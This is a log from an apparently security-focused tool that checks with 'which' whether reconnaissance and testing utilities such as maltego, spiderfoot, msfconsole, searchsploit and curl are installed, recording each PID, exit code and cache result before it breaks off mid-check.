2025-10-24 01:26:45,438 - __main__ - INFO - 💾 Cached result for command: which recon-ng
2025-10-24 01:26:45,438 - __main__ - INFO - 🔍 Cache MISS for command: which maltego
2025-10-24 01:26:45,438 - __main__ - INFO - 🚀 EXECUTING: which maltego
2025-10-24 01:26:45,438 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,439 - __main__ - INFO - 🆔 PROCESS: PID 43353 started
2025-10-24 01:26:45,439 - __main__ - INFO - 🆔 REGISTERED: Process 43353 - which maltego...
2025-10-24 01:26:45,439 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43353
2025-10-24 01:26:45,441 - __main__ - INFO - 📤 STDOUT: /usr/bin/maltego
2025-10-24 01:26:45,444 - __main__ - INFO - 🧹 CLEANUP: Process 43353 removed from registry
2025-10-24 01:26:45,444 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,444 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,444 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,444 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,444 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which maltego
2025-10-24 01:26:45,444 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,444 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,444 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,444 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,444 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,444 - __main__ - INFO - 💾 Cached result for command: which maltego
2025-10-24 01:26:45,444 - __main__ - INFO - 🔍 Cache MISS for command: which spiderfoot
2025-10-24 01:26:45,444 - __main__ - INFO - 🚀 EXECUTING: which spiderfoot
2025-10-24 01:26:45,444 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,444 - __main__ - INFO - 🆔 PROCESS: PID 43358 started
2025-10-24 01:26:45,444 - __main__ - INFO - 🆔 REGISTERED: Process 43358 - which spiderfoot...
2025-10-24 01:26:45,445 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43358
2025-10-24 01:26:45,446 - __main__ - INFO - 📤 STDOUT: /usr/bin/spiderfoot
2025-10-24 01:26:45,449 - __main__ - INFO - 🧹 CLEANUP: Process 43358 removed from registry
2025-10-24 01:26:45,449 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,449 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,449 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,449 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,449 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which spiderfoot
2025-10-24 01:26:45,449 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,449 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:45,449 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,449 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,449 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,449 - __main__ - INFO - 💾 Cached result for command: which spiderfoot
2025-10-24 01:26:45,449 - __main__ - INFO - 🔍 Cache MISS for command: which shodancli
2025-10-24 01:26:45,449 - __main__ - INFO - 🚀 EXECUTING: which shodancli
2025-10-24 01:26:45,449 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,449 - __main__ - INFO - 🆔 PROCESS: PID 43363 started
2025-10-24 01:26:45,449 - __main__ - INFO - 🆔 REGISTERED: Process 43363 - which shodancli...
2025-10-24 01:26:45,450 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43363
2025-10-24 01:26:45,451 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/shodancli
2025-10-24 01:26:45,452 - __main__ - INFO - 🧹 CLEANUP: Process 43363 removed from registry
2025-10-24 01:26:45,452 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,452 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,452 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,452 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,452 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which shodancli
2025-10-24 01:26:45,452 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,452 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 25 bytes
2025-10-24 01:26:45,452 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,452 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,452 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,452 - __main__ - INFO - 💾 Cached result for command: which shodancli
2025-10-24 01:26:45,452 - __main__ - INFO - 🔍 Cache MISS for command: which censys-cli
2025-10-24 01:26:45,452 - __main__ - INFO - 🚀 EXECUTING: which censys-cli
2025-10-24 01:26:45,452 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,452 - __main__ - INFO - 🆔 PROCESS: PID 43368 started
2025-10-24 01:26:45,452 - __main__ - INFO - 🆔 REGISTERED: Process 43368 - which censys-cli...
2025-10-24 01:26:45,453 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43368
2025-10-24 01:26:45,458 - __main__ - INFO - 🧹 CLEANUP: Process 43368 removed from registry
2025-10-24 01:26:45,458 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:45,458 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,458 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,458 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,458 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which censys-cli
2025-10-24 01:26:45,458 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,458 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,458 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,458 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,458 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,458 - __main__ - INFO - 🔍 Cache MISS for command: which have-i-been-pwned
2025-10-24 01:26:45,458 - __main__ - INFO - 🚀 EXECUTING: which have-i-been-pwned
2025-10-24 01:26:45,458 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,458 - __main__ - INFO - 🆔 PROCESS: PID 43373 started
2025-10-24 01:26:45,458 - __main__ - INFO - 🆔 REGISTERED: Process 43373 - which have-i-been-pwned...
2025-10-24 01:26:45,459 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43373
2025-10-24 01:26:45,464 - __main__ - INFO - 🧹 CLEANUP: Process 43373 removed from registry
2025-10-24 01:26:45,464 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:45,464 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,464 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,464 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,464 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which have-i-been-pwned
2025-10-24 01:26:45,464 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,464 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,464 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,464 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,464 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,464 - __main__ - INFO - 🔍 Cache MISS for command: which metasploit
2025-10-24 01:26:45,464 - __main__ - INFO - 🚀 EXECUTING: which metasploit
2025-10-24 01:26:45,464 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,464 - __main__ - INFO - 🆔 PROCESS: PID 43378 started
2025-10-24 01:26:45,464 - __main__ - INFO - 🆔 REGISTERED: Process 43378 - which metasploit...
2025-10-24 01:26:45,465 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43378
2025-10-24 01:26:45,467 - __main__ - INFO - 🧹 CLEANUP: Process 43378 removed from registry
2025-10-24 01:26:45,467 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:45,467 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,467 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,467 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,467 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which metasploit
2025-10-24 01:26:45,467 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,467 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,467 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,467 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,467 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,467 - __main__ - INFO - 🔍 Cache MISS for command: which msfconsole
2025-10-24 01:26:45,467 - __main__ - INFO - 🚀 EXECUTING: which msfconsole
2025-10-24 01:26:45,467 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,467 - __main__ - INFO - 🆔 PROCESS: PID 43383 started
2025-10-24 01:26:45,467 - __main__ - INFO - 🆔 REGISTERED: Process 43383 - which msfconsole...
2025-10-24 01:26:45,468 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43383
2025-10-24 01:26:45,470 - __main__ - INFO - 📤 STDOUT: /usr/bin/msfconsole
2025-10-24 01:26:45,472 - __main__ - INFO - 🧹 CLEANUP: Process 43383 removed from registry
2025-10-24 01:26:45,472 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,472 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,472 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,472 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,472 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which msfconsole
2025-10-24 01:26:45,472 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,472 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:45,472 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,472 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,472 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,472 - __main__ - INFO - 💾 Cached result for command: which msfconsole
2025-10-24 01:26:45,472 - __main__ - INFO - 🔍 Cache MISS for command: which exploit-db
2025-10-24 01:26:45,472 - __main__ - INFO - 🚀 EXECUTING: which exploit-db
2025-10-24 01:26:45,472 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,472 - __main__ - INFO - 🆔 PROCESS: PID 43388 started
2025-10-24 01:26:45,472 - __main__ - INFO - 🆔 REGISTERED: Process 43388 - which exploit-db...
2025-10-24 01:26:45,473 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43388
2025-10-24 01:26:45,474 - __main__ - INFO - 📤 STDOUT: /usr/bin/exploit-db
2025-10-24 01:26:45,477 - __main__ - INFO - 🧹 CLEANUP: Process 43388 removed from registry
2025-10-24 01:26:45,477 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,477 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,477 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,477 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,477 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which exploit-db
2025-10-24 01:26:45,477 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,477 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:45,477 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,477 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,477 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,477 - __main__ - INFO - 💾 Cached result for command: which exploit-db
2025-10-24 01:26:45,477 - __main__ - INFO - 🔍 Cache MISS for command: which searchsploit
2025-10-24 01:26:45,477 - __main__ - INFO - 🚀 EXECUTING: which searchsploit
2025-10-24 01:26:45,477 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,477 - __main__ - INFO - 🆔 PROCESS: PID 43393 started
2025-10-24 01:26:45,477 - __main__ - INFO - 🆔 REGISTERED: Process 43393 - which searchsploit...
2025-10-24 01:26:45,478 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43393
2025-10-24 01:26:45,480 - __main__ - INFO - 📤 STDOUT: /usr/bin/searchsploit
2025-10-24 01:26:45,482 - __main__ - INFO - 🧹 CLEANUP: Process 43393 removed from registry
2025-10-24 01:26:45,482 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,482 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,482 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,482 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,482 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which searchsploit
2025-10-24 01:26:45,482 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,482 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 01:26:45,482 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,482 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,482 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,482 - __main__ - INFO - 💾 Cached result for command: which searchsploit
2025-10-24 01:26:45,482 - __main__ - INFO - 🔍 Cache MISS for command: which api-schema-analyzer
2025-10-24 01:26:45,482 - __main__ - INFO - 🚀 EXECUTING: which api-schema-analyzer
2025-10-24 01:26:45,482 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,483 - __main__ - INFO - 🆔 PROCESS: PID 43398 started
2025-10-24 01:26:45,483 - __main__ - INFO - 🆔 REGISTERED: Process 43398 - which api-schema-analyzer...
2025-10-24 01:26:45,484 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43398
2025-10-24 01:26:45,490 - __main__ - INFO - 🧹 CLEANUP: Process 43398 removed from registry
2025-10-24 01:26:45,490 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:45,490 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,490 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,490 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,490 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which api-schema-analyzer
2025-10-24 01:26:45,490 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,490 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,490 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,490 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,490 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,490 - __main__ - INFO - 🔍 Cache MISS for command: which postman
2025-10-24 01:26:45,490 - __main__ - INFO - 🚀 EXECUTING: which postman
2025-10-24 01:26:45,490 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,490 - __main__ - INFO - 🆔 PROCESS: PID 43403 started
2025-10-24 01:26:45,490 - __main__ - INFO - 🆔 REGISTERED: Process 43403 - which postman...
2025-10-24 01:26:45,493 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43403
2025-10-24 01:26:45,496 - __main__ - INFO - 🧹 CLEANUP: Process 43403 removed from registry
2025-10-24 01:26:45,496 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:45,496 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,496 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,496 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,496 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which postman
2025-10-24 01:26:45,496 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,496 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,496 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,496 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,496 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,496 - __main__ - INFO - 🔍 Cache MISS for command: which insomnia
2025-10-24 01:26:45,496 - __main__ - INFO - 🚀 EXECUTING: which insomnia
2025-10-24 01:26:45,496 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,497 - __main__ - INFO - 🆔 PROCESS: PID 43408 started
2025-10-24 01:26:45,497 - __main__ - INFO - 🆔 REGISTERED: Process 43408 - which insomnia...
2025-10-24 01:26:45,498 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43408
2025-10-24 01:26:45,503 - __main__ - INFO - 🧹 CLEANUP: Process 43408 removed from registry
2025-10-24 01:26:45,503 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.01s
2025-10-24 01:26:45,503 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,503 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,503 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,503 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which insomnia
2025-10-24 01:26:45,503 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,503 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,503 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,503 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,503 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,503 - __main__ - INFO - 🔍 Cache MISS for command: which curl
2025-10-24 01:26:45,503 - __main__ - INFO - 🚀 EXECUTING: which curl
2025-10-24 01:26:45,503 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,504 - __main__ - INFO - 🆔 PROCESS: PID 43413 started
2025-10-24 01:26:45,504 - __main__ - INFO - 🆔 REGISTERED: Process 43413 - which curl...
2025-10-24 01:26:45,505 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43413
2025-10-24 01:26:45,506 - __main__ - INFO - 📤 STDOUT: /usr/bin/curl
2025-10-24 01:26:45,506 - __main__ - INFO - 🧹 CLEANUP: Process 43413 removed from registry
2025-10-24 01:26:45,506 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,506 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,506 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,506 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,506 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which curl
2025-10-24 01:26:45,507 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,507 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 14 bytes
2025-10-24 01:26:45,507 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,507 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,507 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,507 - __main__ - INFO - 💾 Cached result for command: which curl
2025-10-24 01:26:45,507 - __main__ - INFO - 🔍 Cache MISS for command: which httpie
2025-10-24 01:26:45,507 - __main__ - INFO - 🚀 EXECUTING: which httpie
2025-10-24 01:26:45,507 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,507 - __main__ - INFO - 🆔 PROCESS: PID 43418 started
2025-10-24 01:26:45,507 - __main__ - INFO - 🆔 REGISTERED: Process 43418 - which httpie...
2025-10-24 01:26:45,508 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43418
2025-10-24 01:26:45,511 - __main__ - INFO - 📤 STDOUT: /usr/bin/httpie
2025-10-24 01:26:45,525 - __main__ - INFO - 🧹 CLEANUP: Process 43418 removed from registry
2025-10-24 01:26:45,526 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.02s
2025-10-24 01:26:45,526 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,526 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,526 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,526 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which httpie
2025-10-24 01:26:45,526 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.02s
2025-10-24 01:26:45,526 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,526 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,526 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,526 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,526 - __main__ - INFO - 💾 Cached result for command: which httpie
2025-10-24 01:26:45,526 - __main__ - INFO - 🔍 Cache MISS for command: which anew
2025-10-24 01:26:45,526 - __main__ - INFO - 🚀 EXECUTING: which anew
2025-10-24 01:26:45,526 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,527 - __main__ - INFO - 🆔 PROCESS: PID 43423 started
